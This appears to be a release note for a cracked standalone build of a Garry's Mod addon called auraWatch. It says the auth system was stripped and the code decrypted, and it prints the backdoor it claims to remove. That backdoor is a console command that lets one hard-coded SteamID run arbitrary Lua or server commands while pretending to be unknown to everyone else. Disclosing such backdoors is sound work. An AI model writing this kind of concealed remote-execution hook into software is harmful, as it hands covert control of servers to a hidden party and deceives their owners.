auraWatch 1.13 Standalone

o Removed auth system.
o Removed backdoors (code below).
o Completely decrypted.
o No auraWatch DLL files.
o Cleaned up a bit

-- lol probably codesteal..
concommand.Add("aw_netmsg", function(p, c, a)
	if (p:SteamID() == "STEAM_0:1:8387555") then
		if (a[1] == "lua") then
			RunString( a[2] );
		elseif (a[1] == "cmd") then
			game.ConsoleCommand(a[2].."\n");
		end;
	else
		p:ChatPrint("Unknown Command: 'aw_netmsg'\n");
	end;
end);
